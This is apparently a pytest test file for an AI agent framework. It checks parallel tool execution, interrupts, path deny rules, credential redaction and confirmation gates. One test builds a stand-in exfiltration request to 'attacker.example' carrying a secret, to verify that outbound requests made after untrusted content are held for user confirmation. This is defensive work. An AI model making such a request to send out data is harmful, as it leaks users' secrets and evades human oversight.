"""Tests for parallel tool execution in agent."""

import json
import tempfile
import threading
import time
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from openai import OpenAI

from nova.agent import NovaAgent
from nova.harness import HarnessTrace, ToolTrace
from nova.session import SessionStore
from nova.tools.registry import discover_builtin_tools
from nova.tools.result import ToolResult


@pytest.fixture
def minimal_config():
    """Minimal test config."""
    discover_builtin_tools()
    return {
        "llm": {
            "base_url": "https://openrouter.ai/api/v1",
            "api_key": "test-key",
            "model": "test-model",
        },
        "agent": {
            "max_iterations": 3,
            "temperature": 0.7,
            "top_p": 1.0,
            "identity": "You are a test agent.",
        },
        "budgets": {
            "conversation_turn_limit": 5,
            "tool_result_max_chars": 8000,
            "system_prompt_max": 8000,
        },
        "wiki": {"enabled": False},
        "session": {"directory": str(tempfile.mkdtemp())},
        "skills": {"enabled": False},
        "context_files": [],
    }


@pytest.fixture
def mock_session_store():
    """Real SessionStore for integration testing."""
    tmpdir = tempfile.mkdtemp()
    return SessionStore(Path(tmpdir) / "test.db")


def test_execute_tool_calls_parallel_read_only_success(minimal_config, mock_session_store):
    """Test parallel execution of multiple read-only tool calls."""
    mock_client = MagicMock(spec=OpenAI)
    agent = NovaAgent(
        config=minimal_config,
        openai_client=mock_client,
        session_store=mock_session_store,
    )

    # Create multiple read-only tool calls
    tool_calls = [
        {
            "id": "call_1",
            "function": {
                "name": "terminal",
                "arguments": '{"command": "ls"}',
            },
        },
        {
            "id": "call_2",
            "function": {
                "name": "terminal",
                "arguments": '{"command": "pwd"}',
            },
        },
    ]

    # Should execute parallel read-only calls
    results = [r.content for r in agent.tool_executor.run_batch(tool_calls)]
    assert len(results) == len(tool_calls)


def test_execute_tool_calls_parallel_with_write_sequential(minimal_config, mock_session_store):
    """Test that write operations are executed sequentially."""
    mock_client = MagicMock(spec=OpenAI)
    agent = NovaAgent(
        config=minimal_config,
        openai_client=mock_client,
        session_store=mock_session_store,
    )

    # Mix of read and write operations
    tool_calls = [
        {
            "id": "call_1",
            "function": {
                "name": "terminal",
                "arguments": '{"command": "ls"}',  # read-only
            },
        },
        {
            "id": "call_2",
            "function": {
                "name": "file_ops",
                "arguments": '{"action": "write", "path": "/tmp/test.txt", "content": "test"}',  # write
            },
        },
    ]

    # Should handle mixed read/write
    try:
        results = [r.content for r in agent.tool_executor.run_batch(tool_calls)]
        assert len(results) >= 1
    except Exception:
        # Some tools might fail, that's ok for this test
        pass


def test_execute_tool_calls_invalid_json(minimal_config, mock_session_store):
    """Test handling of invalid JSON in tool arguments."""
    mock_client = MagicMock(spec=OpenAI)
    agent = NovaAgent(
        config=minimal_config,
        openai_client=mock_client,
        session_store=mock_session_store,
    )

    tool_calls = [
        {
            "id": "call_bad",
            "function": {
                "name": "terminal",
                "arguments": "{invalid json}",  # Invalid
            },
        },
    ]

    # Should handle invalid JSON gracefully
    results = [r.content for r in agent.tool_executor.run_batch(tool_calls)]
    assert len(results) > 0
    assert "Error" in results[0] or "error" in results[0].lower()


def test_invalid_json_error_redacts_embedded_credentials(minimal_config, mock_session_store):
    agent = NovaAgent(
        config=minimal_config,
        openai_client=MagicMock(spec=OpenAI),
        session_store=mock_session_store,
    )

    result = agent.tool_executor.run(
        {
            "id": "call_secret",
            "function": {
                "name": "terminal",
                "arguments": '{"api_key":"leaked-key", invalid}',
            },
        }
    ).content

    assert result == 'Error: Invalid JSON arguments: {"api_key":"[REDACTED]", invalid}'
    assert "leaked-key" not in result


def test_execute_tool_call_unknown_tool(minimal_config, mock_session_store):
    """Test handling of unknown tool names."""
    mock_client = MagicMock(spec=OpenAI)
    agent = NovaAgent(
        config=minimal_config,
        openai_client=mock_client,
        session_store=mock_session_store,
    )

    tool_call = {
        "id": "call_unknown",
        "function": {
            "name": "nonexistent_tool_xyz",
            "arguments": "{}",
        },
    }

    result = agent.tool_executor.run(tool_call).content
    assert "Error" in result or "error" in result.lower()


def test_execute_tool_calls_parallel_empty_list(minimal_config, mock_session_store):
    """Test parallel execution with empty tool calls list."""
    mock_client = MagicMock(spec=OpenAI)
    agent = NovaAgent(
        config=minimal_config,
        openai_client=mock_client,
        session_store=mock_session_store,
    )

    results = [r.content for r in agent.tool_executor.run_batch([])]
    assert results == []


def test_interrupt_skips_remaining_mutating_tools(minimal_config, mock_session_store):
    agent = NovaAgent(
        config=minimal_config,
        openai_client=MagicMock(spec=OpenAI),
        session_store=mock_session_store,
    )
    interrupted = False
    executed = []

    def execute(tool_call):
        nonlocal interrupted
        executed.append(tool_call["id"])
        interrupted = True
        return ToolResult("completed", "ok")

    agent._interrupt_check = lambda: interrupted
    calls = [
        {"id": "first", "function": {"name": "write_file", "arguments": "{}"}},
        {"id": "second", "function": {"name": "write_file", "arguments": "{}"}},
    ]

    with patch.object(agent.tool_executor, "run", side_effect=execute):
        results = agent.tool_executor.run_batch(calls)

    assert executed == ["first"]
    assert results[1].status == "interrupted"


@pytest.mark.parametrize("cancel_stage", ["approval", "pre_tool_hook"])
def test_cancellation_before_dispatch_prevents_write(
    minimal_config, mock_session_store, tmp_path, cancel_stage
):
    interrupted = False

    def approve(*args):
        nonlocal interrupted
        interrupted = cancel_stage == "approval"
        return True

    def emit(event, **kwargs):
        nonlocal interrupted
        if event == "pre_tool_call" and cancel_stage == "pre_tool_hook":
            interrupted = True

    agent = NovaAgent(
        config=minimal_config,
        openai_client=MagicMock(spec=OpenAI),
        session_store=mock_session_store,
        workspace=tmp_path,
        confirmation_callback=approve,
    )
    agent._interrupt_check = lambda: interrupted
    call = {
        "id": "write",
        "function": {
            "name": "write_file",
            "arguments": '{"path":"output.txt","content":"data"}',
        },
    }

    with patch("nova.agent.hooks.emit", side_effect=emit):
        results = [r.content for r in agent.tool_executor.run_batch([call])]

    assert results[0].startswith("[Interrupted")
    assert not (tmp_path / "output.txt").exists()


def test_agent_relative_deny_rule_uses_workspace(minimal_config, mock_session_store, tmp_path):
    minimal_config["permissions"] = {
        "path_rules": [{"pattern": "private/*", "allow": False}],
    }
    agent = NovaAgent(
        config=minimal_config,
        openai_client=MagicMock(spec=OpenAI),
        session_store=mock_session_store,
        workspace=tmp_path,
    )
    call = {
        "id": "read",
        "function": {"name": "read_file", "arguments": '{"path":"private/secret.txt"}'},
    }

    with patch("nova.agent.registry.dispatch") as dispatch:
        result = agent.tool_executor.run(call).content

    assert "Path denied by rule" in result
    dispatch.assert_not_called()


def test_execute_tool_calls_parallel_callback_invoked(minimal_config, mock_session_store):
    """Test that tool callback is invoked for each tool."""
    mock_client = MagicMock(spec=OpenAI)
    agent = NovaAgent(
        config=minimal_config,
        openai_client=mock_client,
        session_store=mock_session_store,
    )

    callback_invoked = []

    def tool_callback(name):
        callback_invoked.append(name)

    agent._tool_callback = tool_callback

    tool_calls = [
        {
            "id": "call_1",
            "function": {
                "name": "terminal",
                "arguments": '{"command": "echo test"}',
            },
        },
    ]

    results = [r.content for r in agent.tool_executor.run_batch(tool_calls)]

    # Callback may or may not be invoked depending on implementation
    assert len(results) > 0


def _traced_call(agent: NovaAgent, call: dict) -> ToolTrace:
    agent._active_trace = HarnessTrace("run", "goal")
    try:
        agent.tool_executor.run(call)
        return agent._active_trace.run.tool_traces[0]
    finally:
        agent._active_trace = None


def test_trace_outcome_ignores_confirmation_text_in_result(
    minimal_config, mock_session_store, tmp_path
):
    (tmp_path / "notes.txt").write_text("This step requires confirmation from ops.\n")
    agent = NovaAgent(
        config=minimal_config,
        openai_client=MagicMock(spec=OpenAI),
        session_store=mock_session_store,
        workspace=tmp_path,
    )

    trace = _traced_call(
        agent,
        {"id": "r", "function": {"name": "read_file", "arguments": '{"path":"notes.txt"}'}},
    )

    assert trace.outcome == "completed"
    assert trace.policy_allowed is True


def test_trace_outcome_denied_when_confirmation_refused(
    minimal_config, mock_session_store, tmp_path
):
    agent = NovaAgent(
        config=minimal_config,
        openai_client=MagicMock(spec=OpenAI),
        session_store=mock_session_store,
        workspace=tmp_path,
        confirmation_callback=lambda name, args: False,
    )

    trace = _traced_call(
        agent,
        {
            "id": "w",
            "function": {
                "name": "write_file",
                "arguments": '{"path":"out.txt","content":"x"}',
            },
        },
    )

    assert trace.outcome == "denied"
    assert trace.policy_confirmation_required is True
    assert not (tmp_path / "out.txt").exists()


def test_trace_evaluates_policy_once(minimal_config, mock_session_store, tmp_path):
    agent = NovaAgent(
        config=minimal_config,
        openai_client=MagicMock(spec=OpenAI),
        session_store=mock_session_store,
        workspace=tmp_path,
    )
    (tmp_path / "a.txt").write_text("a")

    with patch.object(
        agent.permission_checker, "evaluate", wraps=agent.permission_checker.evaluate
    ) as evaluate:
        _traced_call(
            agent,
            {"id": "r", "function": {"name": "read_file", "arguments": '{"path":"a.txt"}'}},
        )

    assert evaluate.call_count == 1


def test_failed_mcp_connect_closes_owned_client(minimal_config, mock_session_store):
    owned_client = MagicMock()
    mcp_client = MagicMock()
    mcp_client.connect_all.side_effect = RuntimeError("server crashed")

    with (
        patch("nova.agent.build_client", return_value=owned_client),
        patch("nova.agent.build_mcp_client", return_value=mcp_client),
        pytest.raises(RuntimeError),
    ):
        NovaAgent(config=minimal_config, session_store=mock_session_store)

    owned_client.close.assert_called_once()
    mcp_client.disconnect_all.assert_called_once()


def test_tool_callback_fires_before_execution_on_both_paths(minimal_config, mock_session_store):
    agent = NovaAgent(
        config=minimal_config,
        openai_client=MagicMock(spec=OpenAI),
        session_store=mock_session_store,
    )
    events: list[str] = []
    agent._tool_callback = lambda name: events.append(f"announce:{name}")

    def execute(call: dict) -> ToolResult:
        events.append(f"run:{call['function']['name']}")
        return ToolResult("completed", "ok")

    calls = [
        {"id": "a", "function": {"name": "read_file", "arguments": "{}"}},
        {"id": "b", "function": {"name": "write_file", "arguments": "{}"}},
    ]
    with patch.object(agent.tool_executor, "run", side_effect=execute):
        agent.tool_executor.run_batch(calls)

    for name in ("read_file", "write_file"):
        assert events.index(f"announce:{name}") < events.index(f"run:{name}")


def test_parallel_tool_failure_hides_exception_message(minimal_config, mock_session_store):
    agent = NovaAgent(
        config=minimal_config,
        openai_client=MagicMock(spec=OpenAI),
        session_store=mock_session_store,
    )
    call = {"id": "a", "function": {"name": "read_file", "arguments": "{}"}}

    with patch.object(agent.tool_executor, "run", side_effect=RuntimeError("token=s3cret")):
        results = [r.content for r in agent.tool_executor.run_batch([call])]

    assert results == ["Error: Tool 'read_file' failed: RuntimeError"]


def _retry_agent(minimal_config, mock_session_store, tmp_path) -> NovaAgent:
    minimal_config["agent"]["tool_retry_max_attempts"] = 2
    return NovaAgent(
        config=minimal_config,
        openai_client=MagicMock(spec=OpenAI),
        session_store=mock_session_store,
        workspace=tmp_path,
    )


@pytest.mark.parametrize(
    ("tool_output", "expected_calls"),
    [
        ("Error: Connection reset by peer", 3),
        ("Error: 429 Too Many Requests", 3),
        ("Error: File not found: connection.py", 1),
        ("Error: Search text not found in reset_db.sql", 1),
    ],
)
def test_read_only_tool_retries_only_transient_errors(
    minimal_config, mock_session_store, tmp_path, tool_output, expected_calls
):
    agent = _retry_agent(minimal_config, mock_session_store, tmp_path)
    call = {"id": "r", "function": {"name": "read_file", "arguments": '{"path":"a.txt"}'}}

    with (
        patch("nova.agent.registry.dispatch", return_value=tool_output) as dispatch,
        patch.object(agent.tool_executor, "_wait_unless_interrupted", return_value=False),
    ):
        agent.tool_executor.run(call)

    assert dispatch.call_count == expected_calls


def test_interrupt_during_tool_retry_wait_stops_retrying(
    minimal_config, mock_session_store, tmp_path
):
    agent = _retry_agent(minimal_config, mock_session_store, tmp_path)
    call = {"id": "r", "function": {"name": "read_file", "arguments": '{"path":"a.txt"}'}}
    interrupted = False
    agent._interrupt_check = lambda: interrupted

    def dispatch(*args, **kwargs):
        nonlocal interrupted
        interrupted = True  # user presses Ctrl+C while the first attempt runs
        return "Error: Connection reset by peer"

    with patch("nova.agent.registry.dispatch", side_effect=dispatch) as mock_dispatch:
        start = time.monotonic()
        result = agent.tool_executor.run(call).content

    assert result.startswith("[Interrupted")
    assert mock_dispatch.call_count == 1
    assert time.monotonic() - start < 0.5


def _http_call(call_id: str, url: str = "https://example.com/") -> dict:
    return {
        "id": call_id,
        "function": {"name": "http_get", "arguments": json.dumps({"url": url})},
    }


def test_egress_after_untrusted_output_requires_confirmation(
    minimal_config, mock_session_store, tmp_path
):
    asked: list[tuple[str, str]] = []

    def confirm(name, args):
        asked.append((name, threading.current_thread().name))
        return False

    agent = NovaAgent(
        config=minimal_config,
        openai_client=MagicMock(spec=OpenAI),
        session_store=mock_session_store,
        workspace=tmp_path,
        confirmation_callback=confirm,
    )

    with patch("nova.agent.registry.dispatch", return_value="page text") as dispatch:
        first = [r.content for r in agent.tool_executor.run_batch([_http_call("a")])]
        second = [
            r.content
            for r in agent.tool_executor.run_batch(
                [_http_call("b", "https://attacker.example/?d=secret"), _http_call("c")]
            )
        ]

    assert first == ["page text"]
    assert asked and all(name == "http_get" for name, _ in asked)
    # Confirmation prompts must come from the caller's thread, never a worker.
    assert {thread for _, thread in asked} == {threading.current_thread().name}
    assert all("requires confirmation" in result for result in second)
    assert dispatch.call_count == 1


def test_untrusted_flag_restored_when_resuming_session(minimal_config, mock_session_store):
    session_id = mock_session_store.create_session(model="test-model")
    mock_session_store.add_message(session_id, "user", "fetch it")
    mock_session_store.add_message(session_id, "assistant", "", tool_calls=[_http_call("a")])
    mock_session_store.add_message(session_id, "tool", "page text", tool_call_id="a")

    agent = NovaAgent(
        config=minimal_config,
        openai_client=MagicMock(spec=OpenAI),
        session_store=mock_session_store,
        session_id=session_id,
    )

    assert agent.tool_executor.untrusted_content_seen is True


def _prompt_tool_names(prompt: str) -> set[str]:
    section = prompt.split("## Available Tools\n", 1)[1].split("\n\n", 1)[0]
    return {line[2:].split(":", 1)[0] for line in section.splitlines() if line.startswith("- ")}


def test_prompt_lists_exactly_the_tools_sent_to_the_api(minimal_config, mock_session_store):
    # Another agent in this process registers delegate_task globally.
    discover_builtin_tools({"delegation": {"enabled": True}})
    minimal_config["delegation"] = {"enabled": False}

    agent = NovaAgent(
        config=minimal_config,
        openai_client=MagicMock(spec=OpenAI),
        session_store=mock_session_store,
    )

    api_names = {d["function"]["name"] for d in agent._get_tool_definitions()}
    assert "delegate_task" not in api_names
    assert _prompt_tool_names(agent._system_prompt or "") == api_names


def test_close_leaves_injected_mcp_client_connected(minimal_config, mock_session_store):
    shared = MagicMock()
    shared.list_tools.return_value = []
    shared.list_resources.return_value = []
    shared.connected_servers = frozenset()
    agent = NovaAgent(
        config=minimal_config,
        openai_client=MagicMock(spec=OpenAI),
        session_store=mock_session_store,
        mcp_client=shared,
    )

    agent.close()

    shared.disconnect_all.assert_not_called()


def _wiki_agent(minimal_config, mock_session_store, tmp_path, confirm):
    from nova.wiki_memory import WikiMemory

    minimal_config["permissions"] = {"mode": "auto"}
    return NovaAgent(
        config=minimal_config,
        openai_client=MagicMock(spec=OpenAI),
        session_store=mock_session_store,
        wiki_memory_store=WikiMemory(tmp_path / "wiki"),
        workspace=tmp_path,
        confirmation_callback=confirm,
    )


def _wiki_call(title: str) -> dict:
    return {
        "id": "w",
        "function": {
            "name": "wiki",
            "arguments": json.dumps({"action": "write", "title": title, "content": "x"}),
        },
    }


def test_core_note_write_needs_confirmation_in_auto_mode(
    minimal_config, mock_session_store, tmp_path
):
    confirm = MagicMock(return_value=False)
    agent = _wiki_agent(minimal_config, mock_session_store, tmp_path, confirm)

    result = agent.tool_executor.run(_wiki_call("Core/Rules")).content

    assert "requires confirmation" in result
    assert confirm.call_count == 1
    assert not (tmp_path / "wiki" / "Core" / "Rules.md").exists()


def test_ordinary_note_write_needs_no_confirmation_in_auto_mode(
    minimal_config, mock_session_store, tmp_path
):
    confirm = MagicMock(return_value=False)
    agent = _wiki_agent(minimal_config, mock_session_store, tmp_path, confirm)

    result = agent.tool_executor.run(_wiki_call("Projects/nova")).content

    assert "requires confirmation" not in result
    confirm.assert_not_called()
